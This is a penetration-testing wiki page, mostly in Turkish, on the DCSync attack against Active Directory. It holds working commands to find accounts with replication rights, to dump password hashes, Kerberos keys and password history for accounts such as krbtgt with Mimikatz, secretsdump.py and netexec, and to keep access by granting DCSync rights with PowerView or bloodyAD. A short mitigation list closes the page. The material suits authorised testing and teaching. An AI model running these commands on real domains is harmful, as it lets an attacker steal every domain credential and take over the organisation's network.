# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** izni, etki alanının kendisi üzerinde şu izinlere sahip olunduğunu ifade eder: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** ve **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**DCSync hakkında önemli notlar:**

- **DCSync saldırısı, bir Domain Controller davranışını taklit eder ve Directory Replication Service Remote Protocol (MS-DRSR) kullanarak diğer Domain Controller'lardan bilgileri replicate etmelerini ister.** MS-DRSR, Active Directory'nin geçerli ve gerekli bir işlevi olduğundan kapatılamaz veya devre dışı bırakılamaz.
- Varsayılan olarak yalnızca **Domain Admins, Enterprise Admins, Administrators ve Domain Controllers** grupları gerekli ayrıcalıklara sahiptir.
- Uygulamada **full DCSync**, domain naming context üzerinde **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** izinlerini gerektirir. `DS-Replication-Get-Changes-In-Filtered-Set` genellikle bunlarla birlikte delege edilir; ancak tek başına, full krbtgt dump işleminden ziyade **confidential / RODC-filtered attributes** (örneğin eski LAPS tarzı secret'lar) senkronizasyonuyla daha çok ilgilidir.<sup>[[2]](#references)</sup>
- Herhangi bir account password reversible encryption kullanılarak saklanıyorsa, Mimikatz'te password'ü clear text olarak döndürmek için bir seçenek bulunur.

### Enumeration

`powerview` kullanarak bu izinlere kimin sahip olduğunu kontrol edin:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
**non-default principals** ile DCSync haklarına sahip hesaplara odaklanmak istiyorsanız, yerleşik replication-capable grupları filtreleyip yalnızca beklenmeyen trustee'leri inceleyin:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Yerel Olarak Exploit Et
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Uzaktan Exploit Et
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Pratik kapsamlandırılmış örnekler:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### Yakalanmış DC makine TGT'si (ccache) kullanarak DCSync

unconstrained-delegation export-mode senaryolarında, bir Domain Controller makine TGT'si (örneğin `krbtgt@DOMAIN` için `DC1$@DOMAIN`) yakalayabilirsiniz. Daha sonra bu ccache'i kullanarak DC olarak authenticate olabilir ve şifre olmadan DCSync gerçekleştirebilirsiniz.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Operational notes:

- **Impacket's Kerberos path touches SMB first** before the DRSUAPI call. If the environment enforces **SPN target name validation**, a full dump may fail with `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- In that case, either request a **`cifs/<dc>`** service ticket for the target DC first or fall back to **`-just-dc-user`** for the account you need immediately.
- When you only have lower replication rights, LDAP/DirSync-style syncing can still expose **confidential** or **RODC-filtered** attributes (for example legacy `ms-Mcs-AdmPwd`) without a full krbtgt replication.<sup>[[2]](#references)</sup>

`-just-dc` generates 3 files:

- one with the **NTLM hashes**
- one with the **Kerberos keys**
- one with cleartext passwords from the NTDS for any accounts set with [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled. You can get users with reversible encryption with

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

If you are a domain admin, you can grant these permissions to any user with the help of PowerView:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux operatörleri `bloodyAD` ile aynı işlemi yapabilir:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Ardından, çıktısında 3 ayrıcalığın kullanıcıya doğru şekilde atanıp atanmadığını **kontrol edebilirsiniz** (ayrıcalıkların adlarını "ObjectType" alanında görebilmelisiniz):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Nesne için Audit Policy etkinleştirilmelidir) – Bir nesne üzerinde işlem gerçekleştirildi<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Nesne için Audit Policy etkinleştirilmelidir) – Bir directory service nesnesi değiştirildi
- Security Event ID 4670 (Nesne için Audit Policy etkinleştirilmelidir) – Bir nesne üzerindeki izinler değiştirildi
- AD ACL Scanner - ACL'lerin raporlarını oluşturun ve karşılaştırın. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Replication Get-Changes ve Get-Changes-In-Filtered-Set'ten Yararlanma](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Domain Controller'dan Password Hash'lerini Dump Etme](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Hedefli Kerberoast → Unconstrained Delegation → DA'ya DCSync](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
